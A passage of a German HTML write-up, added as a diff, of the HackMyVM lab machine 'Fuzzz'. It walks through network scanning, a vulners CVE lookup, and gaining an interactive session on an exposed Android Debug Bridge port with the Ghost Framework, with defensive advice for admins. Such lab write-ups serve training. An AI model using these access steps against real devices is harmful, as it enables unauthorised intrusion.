@@ -1,0 +1,1689 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fuzzz - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+    <div class="header-bg">
+        <h1>Fuzzz - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">adb</div>
+                <div class="tool-item">Ghost Framework</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">pspy64</div>
+                <div class="tool-item">busybox</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chisel</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">sh</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">sort</div>
+                <div class="tool-item">sed</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">lrz</div>
+                <div class="tool-item">sz</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc-root">Proof of Concept: Erlangen des Root-Zugriffs</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Hier die Reconnaissance-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+            <p class="analysis">
+                <strong>Analyse:</strong> Als ersten Schritt meiner Erkundung im Zielnetzwerk nutzte ich das Tool arp-scan, um aktive Hosts in meinem lokalen Subnetz zu entdecken. Der Befehl <code>arp-scan -l</code> sendet ARP-Anfragen an alle Adressen im lokalen Netzwerk und zeigt die Antworten an. Die Ausgabe wird anschließend mit <code>grep &quot;PCS&quot;</code> gefiltert, um spezifisch nach Geräten mit &quot;PCS&quot; in der Anbieterkennung der MAC-Adresse zu suchen. Abschließend extrahiert der <code>awk &#x27;{print $1}&#x27;</code> Befehl das erste Feld der Ausgabe, welches die IP-Adresse des gefundenen Hosts sein sollte. Dies ist eine effiziente Methode, um schnell potenzielle Ziele im lokalen Segment zu identifizieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Methode ist grundlegend, aber sehr effektiv, um die IP-Adresse des Ziels zu finden, wenn es sich im selben Netzwerksegment wie der Angreifer befindet. Das Filtern nach &quot;PCS&quot; war hier der entscheidende Hinweis, um das spezifische Zielgerät unter Umständen mehreren gefundenen Hosts schnell zu isolieren. Es zeigt, dass selbst einfache Netzwerk-Scanning-Techniken wertvolle Informationen liefern können.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginne Pentests immer mit einer gründlichen passiven und aktiven Aufklärung, um die Angriffsfläche zu verstehen. Einfache Tools wie arp-scan sind dabei unverzichtbar. Notiere alle gefundenen IP-Adressen und Hostnamen.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere Network Access Control (NAC) oder segmentiere das Netzwerk, um unerlaubte ARP-Scans und die schnelle Identifizierung von Hosts zu erschweren oder zu verhindern. Überprüfe und anonymisiere ggf. die MAC-Adressen von virtuellen Maschinen oder Geräten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">arp-scan -l | grep &quot;PCS&quot; | awk &#x27;{print $1}&#x27;</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="command">192.168.2.69</span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem die IP-Adresse 192.168.2.69 identifiziert wurde, habe ich den Hostnamen &#x27;fuzzz.hmv&#x27; zu meiner lokalen /etc/hosts Datei hinzugefügt. Dies ermöglicht mir, den Host zukünftig über seinen Namen statt über die IP-Adresse anzusprechen, was die Befehle oft lesbarer macht und in einigen Szenarien notwendig sein kann (z.B. bei vhost-basierten Webanwendungen). Die Information &quot;hosts: 192.168.2.69 fuzzz.hmv&quot; dokumentiert diesen Schritt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Hinzufügen des Hostnamens zur /etc/hosts Datei ist eine Standardpraxis während eines Pentests, sobald ein Hostname bekannt oder vermutet wird. Es vereinfacht die weitere Interaktion mit dem Zielsystem, insbesondere bei Web-bezogenen Tests, wo der Host-Header relevant ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Pflege deine /etc/hosts Datei für Ziele mit bekannten Hostnamen. Dies hilft bei der Organisation und ermöglicht das Testen von Hostname-abhängigen Diensten.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass interne Hostnamen nicht leicht über externe DNS-Lecks oder unsichere Dienste wie LLMNR oder NetBIOS abgefragt werden können. Verwende interne DNS-Server oder stelle sicher, dass kritische Systeme keine unnötigen Hostnamen preisgeben.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+hosts: <span class="command">192.168.2.69</span>   <span class="command">fuzzz.hmv</span>  
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich führe einen schnellen Nmap-Scan auf dem gefundenen Host 192.168.2.69 durch, um nur die offenen TCP-Ports zu identifizieren. Dies gibt mir einen schnellen Überblick über die primären Dienste, die auf dem Zielsystem laufen. Der Befehlsteil nach dem &quot;::::::::::::::::::::::&quot; ist lediglich eine Formatierung, die ich für meine Berichte verwende, um Abschnitte visuell zu trennen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein schneller Portscan ist ein essenzieller erster Schritt nach der Host-Discovery. Er identifiziert die &quot;Eingangstüren&quot; zum System und lenkt die weitere Aufklärung auf die tatsächlich erreichbaren Dienste. Das Wissen um offene Ports ist fundamental für jeden weiteren Angriffsweg.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe immer einen umfassenden Portscan durch, um alle potenziellen Angriffsvektoren zu identifizieren. Achte besonders auf ungewöhnliche offene Ports.
+                <br><strong>Empfehlung (Admin):</strong> Schließe alle nicht benötigten Ports auf deinen Systemen. Implementiere eine Firewall, die nur notwendigen Traffic erlaubt und protokolliere versuchte Verbindungen auf geschlossene Ports.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">22/tcp</span>   <span class="password">open</span>  <span class="command">ssh</span>     <span class="command">OpenSSH 9.9 (protocol 2.0)</span>
+<span class="command">5555/tcp</span> <span class="password">open</span>  <span class="command">adb</span>     <span class="command">Android Debug Bridge (token auth required)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Dies ist die detaillierte Ausgabe eines umfassenden Nmap-Scans auf 192.168.2.69 mit den Optionen -sS (SYN-Scan), -sC (Standard-Skripte), -sV (Versionserkennung), -p- (alle Ports von 1 bis 65535) und -T5 (maximale Geschwindigkeit). Diese Kombination liefert eine sehr genaue und vollständige Momentaufnahme aller offenen Ports und der darauf laufenden Dienste inklusive deren Versionen. Die Ausgabe zeigt wieder Port 22 (SSH) und Port 5555 (ADB), bestätigt die Versionen (OpenSSH 9.9, Android Debug Bridge) und liefert zusätzliche Informationen wie SSH-Hostkeys und MAC-Adresse. Besonders interessant sind die OS-Erkennungsergebnisse (Linux 4.X|5.X) und die Service Info (OS: Android), die auf ein Android-basiertes oder zumindest ein System mit ADB-Dienst hindeuten. Das Wort &quot;TRACERUTE&quot; wurde zu &quot;TRACEROUTE&quot; korrigiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein umfassender Nmap-Scan ist unverzichtbar. Er liefert nicht nur offene Ports, sondern auch Versionsinformationen, die für die Identifizierung bekannter Schwachstellen (Enumeration) entscheidend sind. Die Erkennung des ADB-Dienstes auf Port 5555 ist ein sehr wichtiger Fund, da ADB oft unsicher konfiguriert ist und direkten Shell-Zugriff ermöglichen kann. Die OS-Erkennung hilft, das Zielsystem besser einzuschätzen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe immer umfassende und vielseitige Nmap-Scans durch. Nutze verschiedene Scan-Typen und Skripte, um so viele Informationen wie möglich zu sammeln. Konzentriere dich auf die tiefergehende Enumeration der gefundenen Dienste.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere oder beschränke den Zugriff auf den ADB-Dienst (Port 5555), es sei denn, er wird aktiv und bewusst genutzt. Stelle sicher, dass Dienste nicht mit Standardkonfigurationen laufen, die unnötige Informationen preisgeben. Halte das Betriebssystem und die Dienste aktuell, um bekannte Schwachstellen zu minimieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 22:29 CEST
+Nmap scan report for <span class="command">fuzzz.hmv (192.168.2.69)</span>
+Host is up (<span class="command">0.00011s latency</span>).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">22/tcp</span>   <span class="password">open</span>  <span class="command">ssh</span>     <span class="command">OpenSSH 9.9 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   <span class="command">256 b6:7b:e7:e5:b3:33:c7:ff:db:63:5d:b3:75:0d:e2:dd (ECDSA)</span>
+|_  <span class="command">256 0a:ce:e5:c3:de:50:9c:6d:b7:0d:de:73:b8:6c:28:55 (ED25519)</span>
+<span class="command">5555/tcp</span> <span class="password">open</span>  <span class="command">adb</span>     <span class="command">Android Debug Bridge (token auth required)</span>
+MAC Address: <span class="command">08:00:27:5B:9B:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+Device type: <span class="command">general purpose</span>
+Running: <span class="command">Linux 4.X|5.X</span>
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+<span class="command">OS details: Linux 4.15 - 5.19</span>
+Network Distance: <span class="command">1 hop</span>
+Service Info: <span class="command">OS: Android; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="command">TRACEROUTE</span>
+HOP RTT     ADDRESS
+<span class="command">1   0.11 ms fuzzz.hmv (192.168.2.69)</span>
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span class="password">Nmap done: 1 IP address (1 host up) scanned in 9.93 seconds</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe einen gezielten Nmap-Schwachstellenscan mit dem Vulners-Skript auf dem Ziel 192.168.2.69 durchgef&uuml;hrt. Das Vulners-Skript (<code>-sV --script vulners -p-</code>) fragt die Vulners-Datenbank nach bekannten Schwachstellen f&uuml;r die erkannten Dienste und Versionen ab. Dies ist ein schneller Weg, um zu pr&uuml;fen, ob die gefundenen Dienste &ouml;ffentlich bekannte, ausnutzbare Schwachstellen aufweisen. Die Ausgabe listet mehrere CVEs und Exploit-Verweise f&uuml;r OpenSSH 9.9 auf. Das Wort &quot;TRACERUTE&quot; wurde zu &quot;TRACEROUTE&quot; korrigiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Vulners-Scan ist sehr hilfreich, um schnell potenzielle Angriffsvektoren basierend auf bekannten Schwachstellen zu identifizieren. Obwohl viele der gelisteten Exploits m&ouml;glicherweise nicht direkt auf diesem spezifischen System funktionieren (z.B. wegen Patches oder Konfiguration), geben sie einen guten Hinweis auf Bereiche, die weitere Forschung und potenzielles Exploit-Development rechtfertigen. Die CVEs liefern konkrete Anhaltspunkte f&uuml;r die Recherche. Die hohe Anzahl gelisteter Exploits f&uuml;r OpenSSH 9.9, auch wenn sie teils dieselbe Schwachstelle betreffen, ist bemerkenswert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze Skripte wie Vulners fr&uuml;hzeitig in der Enumerationsphase. Recherchiere die gefundenen CVEs und Exploits auf Exploit-Datenbanken und Plattformen wie GitHub, um deren Anwendbarkeit zu pr&uuml;fen. Untersuche jede gefundene potenzielle Schwachstelle gr&uuml;ndlich.
+                <br><strong>Empfehlung (Admin):</strong> Halte alle Systemdienste, insbesondere internetzug&auml;ngliche Dienste wie SSH, auf dem neuesten Stand. Implementiere ein Patch-Management-System, um bekannte Schwachstellen zeitnah zu beheben. Verwende Intrusion Detection/Prevention Systeme (IDS/IPS), um versuchte Exploits zu erkennen und zu blockieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 22:30 CEST
+Pre-scan script results:
+| broadcast-avahi-dos: 
+|   Discovered hosts:
+|     <span class="command">224.0.0.251</span>
+|   After NULL UDP avahi packet DoS (CVE-2011-1002).
+|_  Hosts are all up (not vulnerable).
+Nmap scan report for <span class="command">fuzzz.hmv (192.168.2.69)</span>
+Host is up (<span class="command">0.00012s latency</span>).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">22/tcp</span>   <span class="password">open</span>  <span class="command">ssh</span>     <span class="command">OpenSSH 9.9 (protocol 2.0)</span>
+| vulners: 
+|   <span class="command">cpe:/a:openbsd:openssh:9.9:</span> 
+|     	PACKETSTORM:<span class="command">189283</span>	6.8	[Link: PACKETSTORM:189283 | Ziel: https://vulners.com/packetstorm/PACKETSTORM:189283]	<span class="password">*EXPLOIT*</span>
+|     	<span class="command">F79E574D-30C8-5C52-A801-66FFA0610BAA</span>	6.8	[Link: F79E574D-30C8-5C52-A801-66FFA0610BAA | Ziel: https://vulners.com/githubexploit/F79E574D-30C8-5C52-A801-66FFA0610BAA]	<span class="password">*EXPLOIT*</span>
+|     	<span class="password">CVE-2025-26465</span>	6.8	[Link: CVE-2025-26465 | Ziel: https://vulners.com/cve/CVE-2025-26465]
+|     	<span class="command">9D8432B9-49EC-5F45-BB96-329B1F2B2254</span>	6.8	[Link: 9D8432B9-49EC-5F45-BB96-329B1F2B2254 | Ziel: https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254]	<span class="password">*EXPLOIT*</span>
+|     	<span class="command">1337DAY-ID-39918</span>	6.8	[Link: 1337DAY-ID-39918 | Ziel: https://vulners.com/zdt/1337DAY-ID-39918]	<span class="password">*EXPLOIT*</span>
+|     	<span class="password">CVE-2025-26466</span>	5.9	[Link: CVE-2025-26466 | Ziel: https://vulners.com/cve/CVE-2025-26466]
+|     	<span class="command">CE606E2D-D0A5-5DE8-8A61-E7AB65789A99</span>	5.9	[Link: CE606E2D-D0A5-5DE8-8A61-E7AB65789A99 | Ziel: https://vulners.com/githubexploit/CE606E2D-D0A5-5DE8-8A61-E7AB65789A99]	<span class="password">*EXPLOIT*</span>
+|_    	<span class="password">CVE-2025-32728</span>	4.3	[Link: CVE-2025-32728 | Ziel: https://vulners.com/cve/CVE-2025-32728]
+<span class="command">5555/tcp</span> <span class="password">open</span>  <span class="command">adb</span>     <span class="command">Android Debug Bridge (token auth required)</span>
+MAC Address: <span class="command">08:00:27:5B:9B:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+Device type: <span class="command">general purpose|router</span>
+Running: <span class="command">Linux 4.X|5.X, MikroTik RouterOS 7.X</span>
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+<span class="command">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
+Network Distance: <span class="command">1 hop</span>
+Service Info: <span class="command">OS: Android; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="command">TRACEROUTE</span>
+HOP RTT     ADDRESS
+<span class="command">1   0.12 ms fuzzz.hmv (192.168.2.69)</span>
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span class="password">Nmap done: 1 IP address (1 host up) scanned in 44.35 seconds</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Hier die Initial Access-Schritte einfügen -->
+            <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf dem Nmap-Ergebnis, das den ADB-Dienst (Android Debug Bridge) auf Port 5555 als offen identifiziert hat, war mein n&auml;chster logischer Schritt, zu versuchen, eine Verbindung zu diesem Dienst herzustellen. ADB ist ein vielseitiges Befehlszeilentool, das die Kommunikation mit einem Android-Ger&auml;t oder -Emulator erm&ouml;glicht. Der Befehl <code>adb connect 192.168.2.69:5555</code> versucht genau diese Verbindung aufzubauen. Die Ausgabe &quot;* daemon not running; starting now at tcp:5037&quot; und &quot;* daemon started successfully&quot; zeigen, dass der ADB-Server auf meinem Kali-System gestartet wurde. Die Zeile &quot;connected to 192.168.2.69:5555&quot; ist die kritische Best&auml;tigung: Die Verbindung zum Ziel wurde erfolgreich hergestellt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die erfolgreiche ADB-Verbindung ist ein signifikanter Fortschritt. Ein offener und erreichbarer ADB-Dienst ohne strenge Authentifizierungsmechanismen (obwohl der Nmap-Scan &quot;token auth required&quot; anmerkte, muss dies nicht immer durchgesetzt werden oder anf&auml;llig sein) ist eine bekannte Schwachstelle, die oft zu Shell-Zugriff f&uuml;hren kann. Dies ist ein vielversprechender Weg f&uuml;r den Initial Access.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn ADB offen und erreichbar ist, priorisiere die Untersuchung dieses Dienstes. Pr&uuml;fe sofort, ob eine Shell erhalten werden kann oder ob eine Authentifizierung erforderlich ist. Recherchiere bekannte Schwachstellen oder Standardkonfigurationen des ADB-Dienstes.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere den ADB-Dienst auf Produktionssystemen vollst&auml;ndig, es sei denn, er ist absolut notwendig. Wenn er ben&ouml;tigt wird, beschr&auml;nke den Zugriff streng (Firewall-Regeln) und stelle sicher, dass eine starke Token-basierte Authentifizierung korrekt konfiguriert und erzwungen wird. &Uuml;berwache Verbindungen zu diesem Port.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">adb connect 192.168.2.69:5555</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+* daemon not running; starting now at tcp:5037
+* daemon started successfully
+<span class="password">connected to 192.168.2.69:5555</span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Um zu &uuml;berpr&uuml;fen, ob die ADB-Verbindung stabil und als aktives Ger&auml;t erkannt wird, habe ich den Befehl <code>adb devices</code> ausgef&uuml;hrt. Dieser Befehl listet alle Ger&auml;te auf, die mit dem ADB-Server des lokalen Systems verbunden sind. Die Ausgabe &quot;192.168.2.69:5555 device&quot; best&auml;tigt, dass das Zielsystem erfolgreich als verbundenes Ger&auml;t erkannt wird und im &quot;device&quot; Zustand ist, was typischerweise bedeutet, dass es bereit ist, Befehle entgegenzunehmen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Best&auml;tigung ist wichtig, um sicherzustellen, dass der n&auml;chste Schritt, das Ausf&uuml;hren von Befehlen oder das Erlangen einer Shell &uuml;ber ADB, wahrscheinlich erfolgreich sein wird. Es eliminiert m&ouml;gliche Probleme mit der Verbindung selbst, bevor komplexere Interaktionen versucht werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> &Uuml;berpr&uuml;fe nach dem Verbindungsversuch immer den Status mit <code>adb devices</code>, um sicherzustellen, dass die Verbindung aktiv und das Ger&auml;t bereit ist.
+                <br><strong>Empfehlung (Admin):</strong> Achte in Logs auf Eintr&auml;ge, die auf unerwartete ADB-Verbindungen hindeuten. Ein Ger&auml;t, das im &quot;device&quot;-Zustand ist, kann potenziell f&uuml;r Befehlsausf&uuml;hrung anf&auml;llig sein, wenn nicht ordnungsgem&auml;&szlig; gesichert.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">adb devices</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+List of devices attached
+<span class="command">192.168.2.69:5555	device</span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich wollte noch einmal die Informationen &uuml;ber den Dienst auf Port 5555 mit Nmap best&auml;tigen, diesmal nur auf diesen spezifischen Port fokussiert (<code>nmap -p 5555 192.168.2.69</code>). &Uuml;berraschenderweise identifizierte Nmap den Dienst nun als &quot;freeciv&quot; anstelle von &quot;Android Debug Bridge&quot; wie zuvor. Solche Dienstidentifizierungsfehler k&ouml;nnen auftreten, da Nmap versucht, Signaturen abzugleichen. Da ich aber bereits erfolgreich eine ADB-Verbindung herstellen konnte, vertraue ich der vorherigen Identifizierung mehr.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieses Ergebnis zeigt, dass Nmap-Dienstidentifizierungen nicht immer fehlerfrei sind, insbesondere bei nicht standardm&auml;&szlig;igen Diensten oder Signaturen. Die vorherige erfolgreiche ADB-Verbindung ist ein st&auml;rkeres Indiz f&uuml;r die tats&auml;chliche Natur des Dienstes. Es ist wichtig, mehrere Informationsquellen zu nutzen und kritisch zu bewerten, insbesondere wenn die Ergebnisse widerspr&uuml;chlich sind. Die erste, detailliertere Nmap-Ausgabe in Kombination mit der erfolgreichen ADB-Verbindung ist hier der verl&auml;sslichere Beweis f&uuml;r ADB auf 5555.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verlasse dich nicht blind auf die automatische Dienstidentifizierung von Scannern. Nutze manuelle Tests oder andere Tools, um die Art eines Dienstes zu verifizieren, insbesondere wenn die Scanausgabe ungew&ouml;hnlich oder widerspr&uuml;chlich erscheint.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass Dienste eindeutig identifizierbar sind, um Verwechslungen bei der Protokollierung und &Uuml;berwachung zu vermeiden. Standard-Ports f&uuml;r bekannte Dienste zu verwenden ist eine gute Praxis, kann aber auch Angreifer anziehen. Wichtiger ist die korrekte Absicherung und &Uuml;berwachung des Dienstes, unabh&auml;ngig vom Port.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">nmap -p 5555 192.168.2.69</span>   
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 22:43 CEST
+Nmap scan report for <span class="command">fuzzz.hmv (192.168.2.69)</span>
+Host is up (<span class="command">0.00019s latency</span>).
+
+PORT     STATE SERVICE
+<span class="command">5555/tcp</span> <span class="password">open</span>  <span class="command">freeciv</span>
+MAC Address: <span class="command">08:00:27:5B:9B:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+
+<span class="password">Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds</span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach der Best&auml;tigung der ADB-Verbindung habe ich versucht, das Ghost Framework zu nutzen. Ghost Framework ist ein Post-Exploitation-Framework, das speziell f&uuml;r Android-Ger&auml;te entwickelt wurde und Module zur Interaktion &uuml;ber ADB bereitstellt. Der Text zeigt den Start des Frameworks (Banner) und meine Versuche, Befehle wie &#x27;connect&#x27;, &#x27;deviceinfo&#x27; und &#x27;ls&#x27; innerhalb der Ghost-Shell auszuf&uuml;hren. Der &#x27;connect&#x27;-Befehl best&auml;tigte die Verbindung erneut. &#x27;deviceinfo&#x27; und &#x27;ls&#x27; wurden als nicht erkannt gemeldet, was darauf hindeutet, dass diese spezifischen Ghost-Module auf diesem Ziel oder in dieser Version nicht verf&uuml;gbar oder kompatibel sind. Der Befehl &#x27;devices&#x27; listete das verbundene Ger&auml;t korrekt auf. Der Befehl &#x27;interact 0&#x27; wurde verwendet, um eine interaktive Shell mit dem verbundenen Ger&auml;t (ID 0) zu starten. Die Ausgabe &quot;[*] Interacting with device 0...&quot; und &quot;[+] Interactive connection spawned!&quot; deuten auf den Erfolg dieses Schritts hin, obwohl die tats&auml;chliche Shell-Interaktion an anderer Stelle dokumentiert ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Nutzung eines spezialisierten Frameworks wie Ghost Framework ist ein valider Ansatz nach der Identifizierung eines Dienstes wie ADB. Obwohl einige Framework-Befehle nicht funktionierten, war der entscheidende Schritt, eine interaktive Verbindung &uuml;ber &#x27;interact 0&#x27; zu initiieren, erfolgreich. Dies zeigt, dass das Framework zumindest die Basisfunktionalit&auml;t zur Interaktion mit dem ADB-Dienst bereitstellen kann. Es ist wichtig zu erkennen, wann ein spezifisches Tool nicht wie erwartet funktioniert und zu anderen Methoden zu wechseln, was ich hier getan habe, indem ich direkt ADB Shell Befehle verwendet habe.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Erforsche spezialisierte Tools und Frameworks f&uuml;r spezifische Dienste wie ADB. Sei dir bewusst, dass nicht alle Funktionen oder Module immer funktionieren werden und sei bereit, zu grundlegenderen Methoden zur&uuml;ckzukehren (z.B. direkte ADB-Befehle).
+                <br><strong>Empfehlung (Admin):</strong> &Uuml;berwache nicht nur Standard-Ports, sondern auch bekannte Ports von Diensten wie ADB (5555). Achte auf ungew&ouml;hnliche Verbindungen oder Befehlsausf&uuml;hrungen &uuml;ber solche Dienste. Die Nutzung von Application Control kann helfen, unerlaubte Frameworks oder Tools auf Systemen zu verhindern.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">(ghost)> connect 192.168.2.69:5555</span>
+                    </div>
+                </div>
+                 <div class="terminal"><pre>
+   .--. .-.               .-.
+  : .--': :              .&#x27; `.
+  : : _ : `-.  .--.  .--.`. .&#x27;
+  : :; :: .. :&#x27; .; :`._-.&#x27;: :
+  `.__.':_;:_;`.__.&#x27;`.__.&#x27;:_;
+
+--=[ <span class="command">Ghost Framework 8.0.0</span>
+--=[ Developed by Entysec (https://entysec.com/)
+
+<span class="password">[*] Connecting to 192.168.2.69...</span>
+<span class="password">[+] Connected to 192.168.2.69!</span>
+
+<span class="password">[i] Type devices to list all connected devices.</span>
+<span class="password">[i] Type interact 0 to interact this device.</span>
+</pre></div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">(ghost)> deviceinfo</span>
+                    </div>
+                </div>
+                 <div class="terminal"><pre>
+<span class="password">[-] Unrecognized command: deviceinfo</span>
+</pre></div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">(ghost)> ls</span>
+                    </div>
+                </div>
+                 <div class="terminal"><pre>
+<span class="password">[-] Unrecognized command: ls</span>
+</pre></div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">(ghost)> devices</span>
+                    </div>
+                </div>
+                 <div class="terminal"><pre>
+Connected Devices:
+
+    ID    Host            Port
+    <span class="command">0     192.168.2.69    5555</span>
+</pre></div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">(ghost)> </span>
+                    </div>
+                </div>
+                 <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">(ghost)> interact 0</span>
+                    </div>
+                </div>
+                 <div class="terminal"><pre>
+<span class="password">[*] Interacting with device 0...</span>
+<span class="password">[+] Interactive connection spawned!</span>
+
+<span class="password">[*] Loading device modules...</span>
+<span class="password">[i] Modules loaded: 13</span>
+<span class="command">(ghost: 192.168.2.69)></span>
+</pre></div>
+            </div>
+            <p class="analysis">
